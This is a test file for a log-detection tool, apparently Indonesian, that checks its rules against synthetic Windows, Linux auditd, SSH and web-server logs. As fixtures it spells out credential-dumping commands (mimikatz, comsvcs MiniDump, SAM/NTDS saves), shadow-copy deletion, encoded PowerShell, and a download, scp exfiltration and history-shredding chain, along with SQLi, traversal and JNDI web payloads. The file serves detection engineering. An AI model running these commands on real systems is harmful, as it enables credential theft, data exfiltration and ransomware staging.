import { describe, expect, it } from 'vitest'
import { correlate } from '@/core/correlate/correlate'
import { computeCoverage } from '@/core/coverage'
import { runDetections } from '@/core/detect/engine'
import { ingestText } from '@/core/ingest'
import type { NormalizedEvent } from '@/core/model'
import { decodeEncodedCommand } from '@/core/report/decode'
import { loadRulePack } from '@/data/rules'
import { DEFAULT_UNIT_PROFILE } from '@/data/unitProfile'

/**
 * Written from what attackers and admins actually do, not from the demo scenario, whose attack was
 * written alongside the rules. Each case below failed in an audit before the rules were changed.
 */

const pack = loadRulePack()
const rules = [...pack.sigma, ...pack.native].map((r) => r.meta)
const SYSMON = 'Microsoft-Windows-Sysmon/Operational'
const DEFENDER = 'Microsoft-Windows-Windows Defender/Operational'
const PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
const B64 = 'JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA='

function win(eventId: number, channel: string, data: Record<string, unknown>, computer = 'WS-1', time = '2026-11-03T02:00:00.000Z') {
  return { EventID: eventId, Channel: channel, Computer: computer, TimeCreated: time, ProviderName: 'x', EventData: data }
}
const proc = (command: string, image: string, extra: Record<string, unknown> = {}) => win(1, SYSMON, { Image: image, CommandLine: command, ParentImage: 'C:\\Windows\\explorer.exe', ...extra })
const load = (records: object[]) => ingestText(JSON.stringify(records), 'win.json', 'w').events
const fired = (events: NormalizedEvent[]) => new Set(runDetections(events, pack).map((d) => d.ruleId))
const analyse = (events: NormalizedEvent[]) => {
  const detections = runDetections(events, pack)
  return { detections, ...correlate(detections, events, DEFAULT_UNIT_PROFILE) }
}

describe('variations of known techniques', () => {
  it.each([
    ['-enc', `powershell.exe -enc ${B64}`],
    ['-e', `powershell.exe -e ${B64}`],
    ['-en', `powershell.exe -en ${B64}`],
    ['-enco', `powershell.exe -enco ${B64}`],
    ['-EncodedC', `powershell.exe -EncodedC ${B64}`],
    ['-EncodedCommand', `powershell.exe -NoProfile -EncodedCommand ${B64}`],
    ['/e', `powershell.exe /e ${B64}`],
  ])('catches encoded PowerShell written as %s', (_, command) => {
    expect(fired(load([proc(command, PS)]))).toContain('sigap-win-ps-encoded')
  })

  it('does not mistake other short flags for it', () => {
    expect(fired(load([proc('powershell.exe -ep Bypass -File C:\\ops\\backup.ps1', PS), proc('powershell.exe -ExecutionPolicy RemoteSigned', PS)]))).not.toContain('sigap-win-ps-encoded')
  })

  it('catches a renamed PowerShell through its original file name', () => {
    expect(fired(load([proc(`svc.exe -enc ${B64}`, 'C:\\Temp\\svc.exe', { OriginalFileName: 'PowerShell.EXE' })]))).toContain('sigap-win-ps-encoded')
  })

  it('shows the operator what the encoded command says', () => {
    const encoded = btoa(String.fromCharCode(...new Uint8Array(new Uint16Array([...'whoami /all'].map((c) => c.charCodeAt(0))).buffer)))
    expect(decodeEncodedCommand(`powershell.exe -e ${encoded}`)).toBe('whoami /all')
    expect(decodeEncodedCommand('powershell.exe -File x.ps1')).toBeNull()
    expect(decodeEncodedCommand('powershell.exe -e bukanbase64')).toBeNull()
  })

  it.each([
    ['by name', 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full', 'sigap-win-lsass-dump-comsvcs'],
    ['by ordinal', 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, #24 624 C:\\t\\l.dmp full', 'sigap-win-lsass-dump-comsvcs'],
    ['by ordinal, odd form', 'rundll32 comsvcs #+24 624 l.dmp full', 'sigap-win-lsass-dump-comsvcs'],
    ['procdump', 'procdump64.exe -ma lsass.exe C:\\t\\l.dmp', 'sigap-win-cred-dump-tools'],
    ['mimikatz', 'mimikatz.exe "sekurlsa::logonpasswords" exit', 'sigap-win-cred-dump-tools'],
    ['SAM hive', 'reg.exe save HKLM\\SAM C:\\t\\sam.save', 'sigap-win-sam-ntds-dump'],
    ['NTDS', 'ntdsutil "ac i ntds" "ifm" "create full c:\\t" q q', 'sigap-win-sam-ntds-dump'],
  ])('catches credential theft: %s', (_, command, rule) => {
    expect(fired(load([proc(command, 'C:\\x.exe')]))).toContain(rule)
  })

  it.each([
    'vssadmin.exe delete shadows /all /quiet',
    'wmic shadowcopy delete',
    'wbadmin delete catalog -quiet',
    'bcdedit /set {default} recoveryenabled no',
    'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures',
    'powershell Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }',
  ])('catches ransomware preparing the ground: %s', (command) => {
    const detections = runDetections(load([proc(command, 'C:\\x.exe')]), pack)
    expect(detections.map((d) => d.ruleId)).toContain('sigap-win-ransomware-inhibit')
    expect(detections.find((d) => d.ruleId === 'sigap-win-ransomware-inhibit')).toMatchObject({ level: 'critical', signal: 'kuat' })
  })

  it('does not take a shadow-copy listing for ransomware', () => {
    expect(fired(load([proc('vssadmin list shadows', 'C:\\Windows\\System32\\vssadmin.exe')]))).not.toContain('sigap-win-ransomware-inhibit')
  })
})

describe('what a machine without Sysmon still shows', () => {
  it('reads Microsoft Defender as a detection source', () => {
    expect(fired(load([win(1116, DEFENDER, { 'Threat Name': 'Trojan:Win32/Test', Path: 'C:\\t\\a.exe' })]))).toContain('sigap-win-defender-detection')
    expect(fired(load([win(1119, DEFENDER, { 'Threat Name': 'Trojan:Win32/Test' })]))).toContain('sigap-win-defender-action-failed')
    expect(fired(load([win(5001, DEFENDER, {})]))).toContain('sigap-win-defender-off')
    // Routine scans and signature updates are not findings.
    expect(fired(load([win(1000, DEFENDER, {}), win(1001, DEFENDER, {}), win(2000, DEFENDER, {}), win(5007, DEFENDER, {})]))).toEqual(new Set())
  })

  it('catches a new administrator, on any Windows language', () => {
    expect(fired(load([win(4732, 'Security', { TargetUserName: 'Administrator', TargetSid: 'S-1-5-32-544', MemberSid: 'S-1-5-21-1-2-3-1009' })]))).toContain('sigap-win-admin-group-add')
    expect(fired(load([win(4732, 'Security', { TargetUserName: 'Administrators', TargetSid: 'S-1-5-32-544' })]))).toContain('sigap-win-admin-group-add')
    expect(fired(load([win(4732, 'Security', { TargetUserName: 'Pengguna Jarak Jauh', TargetSid: 'S-1-5-32-555' })]))).not.toContain('sigap-win-admin-group-add')
  })

  it('catches a service running from a folder users can write to', () => {
    expect(fired(load([win(7045, 'System', { ServiceName: 'WinSvc', ImagePath: 'C:\\Users\\Public\\svc.exe' })]))).toContain('sigap-win-psexec-service')
    expect(fired(load([win(7045, 'System', { ServiceName: 'Upd', ImagePath: '"C:\\ProgramData\\svc.exe" -k' })]))).toContain('sigap-win-psexec-service')
    expect(fired(load([win(7045, 'System', { ServiceName: 'Upd', ImagePath: '\\??\\C:\\Users\\budi\\AppData\\Local\\d.sys' })]))).toContain('sigap-win-psexec-service')
    expect(fired(load([win(7045, 'System', { ServiceName: 'Spooler', ImagePath: 'C:\\Windows\\System32\\spoolsv.exe' })]))).toEqual(new Set())
  })

  // Each of these fired on an ordinary laptop's real logs, a dozen times in a week.
  it.each([
    ['Defender core service', 'Microsoft Defender Core Service', '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1\\MpDefenderCoreService.exe"'],
    ['Defender driver', 'MpKslbaea6a42', '\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{ABC}\\MpKslDrv.sys'],
    ['vendor service with a ProgramData argument', 'NVIDIA LocalSystem Container', '"C:\\Program Files\\NVIDIA Corporation\\NvContainer\\nvcontainer.exe" -s NVDisplay -f "C:\\ProgramData\\NVIDIA\\x.log" -l 3'],
  ])('leaves %s alone', (_, service, path) => {
    expect(fired(load([win(7045, 'System', { ServiceName: service, ImagePath: path })]))).toEqual(new Set())
  })

  it('catches a Windows logon that follows password guessing', () => {
    const fails = Array.from({ length: 6 }, (_, i) => win(4625, 'Security', { TargetUserName: 'admin', IpAddress: '10.1.1.9', LogonType: 3 }, 'SRV-1', `2026-11-03T02:00:0${i}.000Z`))
    const success = win(4624, 'Security', { TargetUserName: 'admin', IpAddress: '10.1.1.9', LogonType: 3 }, 'SRV-1', '2026-11-03T02:05:00.000Z')
    expect(fired(load([...fails, success]))).toContain('sigap-native-win-success-after-failures')
    expect(fired(load(fails))).not.toContain('sigap-native-win-success-after-failures')
  })

  it('does not blame the routine logons of whoever owns the infected PC', () => {
    const routine = win(4624, 'Security', { TargetUserName: 'budi', IpAddress: '10.1.1.9', LogonType: 3 }, 'SRV-1', '2026-11-03T01:00:00.000Z')
    const fails = Array.from({ length: 6 }, (_, i) => win(4625, 'Security', { TargetUserName: 'administrator', IpAddress: '10.1.1.9', LogonType: 3 }, 'SRV-1', `2026-11-03T02:00:0${i}.000Z`))
    const again = win(4624, 'Security', { TargetUserName: 'budi', IpAddress: '10.1.1.9', LogonType: 3 }, 'SRV-1', '2026-11-03T02:05:00.000Z')
    const stolen = win(4624, 'Security', { TargetUserName: 'admin.it', IpAddress: '10.1.1.9', LogonType: 3 }, 'SRV-1', '2026-11-03T02:06:00.000Z')
    expect(fired(load([routine, ...fails, again]))).not.toContain('sigap-native-win-success-after-failures')
    expect(fired(load([routine, ...fails, again, stolen]))).toContain('sigap-native-win-success-after-failures')
  })
})

describe('rule values that end in a backslash', () => {
  it('matches a folder written with trailing separators, in rules that list one', () => {
    const task = (payload: string) => proc(`schtasks.exe /create /tn x /tr "${payload}" /sc daily`, 'C:\\Windows\\System32\\schtasks.exe')
    expect(fired(load([task('C:\\ProgramData\\u.exe')]))).toContain('sigap-win-schtask-create')
    expect(fired(load([task('C:\\Users\\a\\AppData\\Local\\u.exe')]))).toContain('sigap-win-schtask-create')
    expect(fired(load([task('C:\\Program Files\\App\\u.exe')]))).not.toContain('sigap-win-schtask-create')
  })

  it('catches Windows-style path traversal', () => {
    const line = '198.51.100.1 - - [03/Nov/2026:01:00:00 +0700] "GET /a?f=..%5c..%5cwindows HTTP/1.1" 400 1 "-" "x"'
    expect(fired(ingestText(line, 'web-1-access.log', 'w').events)).toContain('sigap-web-traversal')
  })
})

describe('removable media and persistence', () => {
  it('flags programs run from the root of a USB drive', () => {
    expect(fired(load([proc('E:\\Dokumen.exe', 'E:\\Dokumen.exe')]))).toContain('sigap-win-exec-from-usb')
    expect(fired(load([proc('cmd.exe /c E:\\RECYCLER\\a.exe', 'C:\\Windows\\System32\\cmd.exe')]))).toContain('sigap-win-exec-from-usb')
    expect(fired(load([proc('C:\\Windows\\notepad.exe', 'C:\\Windows\\notepad.exe')]))).toEqual(new Set())
  })

  it('flags shortcuts written to the root of a USB drive', () => {
    expect(fired(load([win(11, SYSMON, { Image: 'C:\\t\\a.exe', TargetFilename: 'E:\\Dokumen.lnk' })]))).toContain('sigap-win-file-to-usb')
    expect(fired(load([win(11, SYSMON, { Image: 'C:\\t\\a.exe', TargetFilename: 'E:\\foto\\liburan.jpg' })]))).toEqual(new Set())
  })

  it('flags a Run key that launches from a user folder, and a scheduled task with a payload', () => {
    expect(fired(load([win(13, SYSMON, { TargetObject: 'HKU\\S\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Upd', Details: 'C:\\Users\\a\\AppData\\Local\\u.exe', Image: 'C:\\t\\a.exe' })]))).toContain('sigap-win-run-key')
    expect(fired(load([win(4698, 'Security', { TaskName: '\\Updater', TaskContent: '<Exec><Command>powershell.exe</Command></Exec>' })]))).toContain('sigap-win-scheduled-task-registered')
    expect(fired(load([win(4698, 'Security', { TaskName: '\\Microsoft\\Office', TaskContent: '<Exec><Command>C:\\Program Files\\Office\\u.exe</Command></Exec>' })]))).toEqual(new Set())
  })
})

describe('the slide 9 attack from the briefing webinar', () => {
  const auth = (lines: string[]) => ingestText(lines.join('\n'), 'srv-hr-auth.log', 'a', { defaultYear: 2026, now: Date.UTC(2026, 10, 6) }).events
  const slide = [
    'Nov  3 08:14:02 srv-hr sshd[901]: Failed password for admin from 10.20.4.17 port 50122 ssh2',
    'Nov  3 08:14:05 srv-hr sshd[901]: Failed password for admin from 10.20.4.17 port 50123 ssh2',
    'Nov  3 08:14:09 srv-hr sshd[902]: Accepted password for svc_backup from 10.20.4.17 port 50124 ssh2',
    'Nov  3 08:16:31 srv-hr sudo: svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash',
  ]

  it('raises the slide\'s "login after brute force" alert, even with two failures, on another account', () => {
    expect(fired(auth(slide))).toContain('sigap-native-ssh-success-after-failures')
  })

  it('does not raise it when someone mistypes their own password twice', () => {
    const typo = ['Nov  3 08:14:02 srv sshd[1]: Failed password for budi from 10.1.1.1 port 1 ssh2', 'Nov  3 08:14:05 srv sshd[1]: Failed password for budi from 10.1.1.1 port 2 ssh2', 'Nov  3 08:14:09 srv sshd[2]: Accepted password for budi from 10.1.1.1 port 3 ssh2']
    expect(fired(auth(typo))).not.toContain('sigap-native-ssh-success-after-failures')
  })

  it('sees what happens after the login, through auditd', () => {
    const exec = (t: number, serial: number, args: string[]) => [
      `type=SYSCALL msg=audit(1793585${t}.000:${serial}): arch=c000003e syscall=59 success=yes auid=1001 uid=0 exe="/usr/bin/${args[0]}"`,
      `type=EXECVE msg=audit(1793585${t}.000:${serial}): argc=${args.length} ${args.map((a, i) => `a${i}="${a}"`).join(' ')}`,
    ]
    const audit = ingestText([
      ...exec(100, 1, ['curl', '-O', '203.0.113.45/up.sh']),
      ...exec(200, 2, ['tar', 'czf', '/tmp/hr.tgz', '/srv/hr']),
      ...exec(300, 3, ['scp', 'hr.tgz', '203.0.113.45:/tmp']),
      ...exec(400, 4, ['shred', '-u', '/home/svc_backup/.bash_history']),
    ].join('\n'), 'srv-hr-audit.log', 'x').events
    expect(fired(audit)).toEqual(new Set(['sigap-linux-download-script', 'sigap-linux-archive-data', 'sigap-linux-transfer-out', 'sigap-linux-log-tamper']))
    expect(audit[0]).toMatchObject({ host: 'SRV-HR', dataset: 'linux.audit', fields: { command: 'curl -O 203.0.113.45/up.sh', auid: '1001', uid: '0' } })
  })
})

describe('false alarms', () => {
  const internetNoise = () => {
    const lines = ([
      ['198.51.100.7', 'GET /.env', 404, 'Mozilla/5.0 zgrab/0.x'],
      ['198.51.100.7', 'GET /.git/config', 404, 'Mozilla/5.0 zgrab/0.x'],
      ['198.51.100.8', 'GET /index.php?id=1%27%20or%201=1-- ', 200, 'Mozilla/5.0'],
      ['198.51.100.8', 'GET /berita.php?id=1%20union%20select%201,2,3', 200, 'sqlmap/1.8'],
      ['198.51.100.9', 'GET /cgi-bin/../../../../etc/passwd', 400, 'curl/8'],
      ['198.51.100.9', 'GET /?x=${jndi:ldap://198.51.100.9/a}', 200, 'Mozilla/5.0'],
      ['203.0.113.20', 'GET /uploads/shell.php', 403, 'Mozilla/5.0'],
      ['203.0.113.20', 'GET /wp-content/uploads/cmd.php', 301, 'Mozilla/5.0'],
      ['203.0.113.21', 'GET /images/c99-logo.png', 200, 'Mozilla/5.0'],
      ['203.0.113.22', 'GET /phpinfo.php', 404, 'Nuclei'],
    ] as const).map(([ip, request, status, ua], i) => `${ip} - - [03/Nov/2026:0${i}:00:00 +0700] "${request} HTTP/1.1" ${status} 512 "-" "${ua}"`)
    const ssh = Array.from({ length: 12 }, (_, i) => `2026-11-03T10:00:${String(i).padStart(2, '0')}+07:00 web-satuan-01 sshd[9]: Failed password for root from 198.51.100.50 port ${40000 + i} ssh2`)
    return [...ingestText(lines.join('\n'), 'web-satuan-01-access.log', 'n').events, ...ingestText(ssh.join('\n'), 'web-satuan-01-auth.log', 'm').events]
  }

  it('does not call ordinary internet noise a hacked server', () => {
    const { incidents } = analyse(internetNoise())
    expect(incidents).toHaveLength(1)
    expect(incidents[0].assessment).toBe('hanya-percobaan')
    expect(incidents[0].title).toBe('Percobaan serangan terhadap WEB-SATUAN-01 dari 6 alamat luar, belum ada tanda berhasil')
    expect(incidents[0].level).toBe('medium')
    expect(incidents[0].score).toBeLessThan(0.5)
  })

  it('still says hacked once a web shell answers, and names who used it', () => {
    const shell = '203.0.113.99 - - [03/Nov/2026:11:00:00 +0700] "POST /uploads/foto.php HTTP/1.1" 200 54 "-" "python"'
    const { incidents } = analyse([...internetNoise(), ...ingestText(shell, 'web-satuan-01-access.log', 'z').events])
    expect(incidents[0].assessment).toBe('indikasi-kuat')
    expect(incidents[0].title).toBe('Peretasan server WEB-SATUAN-01 dari 203.0.113.99')
    expect(incidents[0].level).toBe('critical')
  })

  it('does not call an admin\'s maintenance day lateral movement', () => {
    const t = (hour: number) => `2026-11-03T0${hour}:00:00.000Z`
    const { incidents } = analyse(load([
      win(4624, 'Security', { LogonType: 10, TargetUserName: 'admin.it', IpAddress: '10.20.1.9', WorkstationName: 'ADMIN-PC' }, 'SRV-SATUAN-01', t(1)),
      win(5140, 'Security', { ShareName: '\\\\*\\ADMIN$', SubjectUserName: 'admin.it', IpAddress: '10.20.1.9' }, 'SRV-SATUAN-01', t(2)),
      win(7045, 'System', { ServiceName: 'PSEXESVC', ImagePath: '%SystemRoot%\\PSEXESVC.exe' }, 'SRV-SATUAN-01', t(2)),
      win(1, SYSMON, { Image: PS, CommandLine: `powershell.exe -NoProfile -enc ${B64}`, ParentImage: 'C:\\Windows\\CCM\\CcmExec.exe', User: 'admin.it' }, 'SRV-SATUAN-01', t(3)),
      win(1, SYSMON, { Image: 'C:\\Windows\\System32\\schtasks.exe', CommandLine: 'schtasks.exe /create /tn BackupHarian /tr "powershell -File D:\\ops\\backup.ps1" /sc daily', ParentImage: PS, User: 'admin.it' }, 'SRV-SATUAN-01', t(3)),
      win(4720, 'Security', { TargetUserName: 'operator.baru', SubjectUserName: 'admin.it' }, 'SRV-SATUAN-01', t(4)),
    ]))
    expect(incidents).toHaveLength(1)
    expect(incidents[0].assessment).toBe('perlu-konfirmasi')
    expect(incidents[0].title).not.toMatch(/Pergerakan lateral|Peretasan|Serangan/)
    expect(incidents[0].title).toContain('Perlu konfirmasi')
    expect(incidents[0].level).toBe('medium')
    expect(incidents[0].score).toBeLessThan(0.7)
    expect(incidents[0].scoreBreakdown.map((t) => t.kind)).not.toContain('killchain')
  })

  it('does not call a harmless page a web shell', () => {
    const line = (target: string, status: number) => `198.51.100.1 - - [03/Nov/2026:01:00:00 +0700] "GET ${target} HTTP/1.1" ${status} 512 "-" "Mozilla/5.0"`
    const web = (target: string, status: number) => fired(ingestText(line(target, status), 'web-1-access.log', 'w').events)
    expect(web('/images/c99-logo.png', 200)).toEqual(new Set())
    expect(web('/uploads/shell.php', 403)).toEqual(new Set(['sigap-web-webshell-probe']))
    expect(web('/uploads/foto.php', 200)).toEqual(new Set(['sigap-web-script-in-upload']))
    expect(web('/uploads/foto.php?cmd=id', 200)).toEqual(new Set(['sigap-web-webshell']))
    expect(web('/.env', 404)).toEqual(new Set(['sigap-web-sensitive-files']))
    expect(web('/.env', 200)).toEqual(new Set(['sigap-web-sensitive-exposed']))
  })

  it('finds injected gambling pages on the unit\'s site', () => {
    const line = (status: number) => `198.51.100.1 - - [03/Nov/2026:01:00:00 +0700] "GET /wp-content/slot-gacor-maxwin.html HTTP/1.1" ${status} 512 "-" "Googlebot"`
    expect(fired(ingestText(line(200), 'web-1-access.log', 'w').events)).toContain('sigap-web-gambling-seo')
    expect(fired(ingestText(line(404), 'web-1-access.log', 'w').events)).not.toContain('sigap-web-gambling-seo')
  })
})

describe('a scanner cannot bury the analyst', () => {
  const flood = (n: number) => Array.from({ length: n }, (_, i) => `198.51.100.7 - - [03/Nov/2026:01:${String(Math.floor(i / 60) % 60).padStart(2, '0')}:${String(i % 60).padStart(2, '0')} +0700] "GET /p${i}?id=1%20union%20select%20${i} HTTP/1.1" 404 512 "-" "sqlmap/1.8"`).join('\n')

  it('folds repeats from one source into one finding that keeps the count', () => {
    const events = ingestText(flood(3000), 'web-1-access.log', 'f').events
    const detections = runDetections(events, pack)
    const sqli = detections.filter((d) => d.ruleId === 'sigap-web-sqli')
    expect(sqli).toHaveLength(1)
    expect(sqli[0].matched['Jumlah kejadian']).toBe('3000')
    expect(sqli[0].eventIds.length).toBeLessThanOrEqual(2000)
    expect(detections.length).toBeLessThan(10)
  })

  it('starts a new finding after a pause, and keeps sources apart', () => {
    const line = (ip: string, minute: number) => `${ip} - - [03/Nov/2026:01:${String(minute).padStart(2, '0')}:00 +0700] "GET /a?id=1%20union%20select%201 HTTP/1.1" 200 1 "-" "x"`
    const events = ingestText([line('198.51.100.1', 0), line('198.51.100.1', 5), line('198.51.100.1', 30), line('198.51.100.2', 0)].join('\n'), 'web-1-access.log', 'f').events
    expect(runDetections(events, pack).filter((d) => d.ruleId === 'sigap-web-sqli').map((d) => d.eventIds.length).sort()).toEqual([1, 1, 2])
  })

  it('stays fast when an ambiguous rule fires thousands of times', () => {
    const records = Array.from({ length: 20000 }, (_, i) => win(22, SYSMON, { Image: PS, QueryName: `h${i}.example`, QueryResults: '198.51.100.9' }, 'WS-1', new Date(Date.UTC(2026, 10, 3, 2, 0, i % 60)).toISOString()))
    const events = load(records)
    const started = performance.now()
    const detections = runDetections(events, pack)
    const { incidents } = correlate(detections, events, DEFAULT_UNIT_PROFILE)
    expect(detections).toHaveLength(20000)
    expect(incidents).toHaveLength(1)
    // Took more than half a minute before; the point is that it no longer grows with the square of the count.
    expect(performance.now() - started).toBeLessThan(10_000)
  })
})

describe('coverage', () => {
  it('says how little a machine without Sysmon or admin rights shows', () => {
    const events = load([win(7040, 'System', {}), win(1000, DEFENDER, {}), win(400, 'Windows PowerShell', {})])
    const coverage = computeCoverage(events, rules, [{ computer: 'WS-1', administrator: false, unread: ['Security'], truncated: [] }])
    expect(coverage.rulesWithData).toBeLessThan(10)
    expect(coverage.complete).toBe(false)
    const gap = (id: string) => coverage.gaps.find((g) => g.id === id)
    expect(gap('win-process')?.status).toBe('tidak-ada')
    expect(gap('win-process')?.fix).toContain('Sysmon')
    // Only the rule that also reads the System log can run; the Security rules cannot.
    expect(gap('win-security')).toMatchObject({ status: 'sebagian', rulesWithData: 1 })
    expect(gap('win-network')).toBeTruthy()
    expect(coverage.warnings.join(' ')).toContain('Tidak terbaca saat dikumpulkan di WS-1: Security')
    expect(coverage.warnings.join(' ')).toContain('Administrator')
  })

  it('counts process rules that need a command line as blind on plain Security 4688', () => {
    const plain = computeCoverage(load([win(4688, 'Security', { NewProcessName: 'C:\\x.exe', ParentProcessName: 'C:\\y.exe' })]), rules)
    const full = computeCoverage(load([win(4688, 'Security', { NewProcessName: 'C:\\x.exe', ParentProcessName: 'C:\\y.exe', CommandLine: 'x' })]), rules)
    const of = (c: typeof plain) => c.sources.find((s) => s.id === 'win-process')!
    expect(of(plain).status).toBe('sebagian')
    expect(of(plain).rulesWithData).toBeGreaterThan(0)
    expect(of(full).status).toBe('ada')
  })

  it('does not nag about Windows when only a web log was brought', () => {
    const coverage = computeCoverage(ingestText('198.51.100.1 - - [03/Nov/2026:01:00:00 +0700] "GET / HTTP/1.1" 200 1 "-" "x"', 'web-1-access.log', 'w').events, rules)
    expect(coverage.gaps).toEqual([])
    expect(coverage.complete).toBe(true)
    expect(coverage.sources.find((s) => s.id === 'win-process')?.status).toBe('tidak-ada')
    expect(coverage.rulesWithData).toBe(coverage.sources.find((s) => s.id === 'web')!.rules)
  })
})
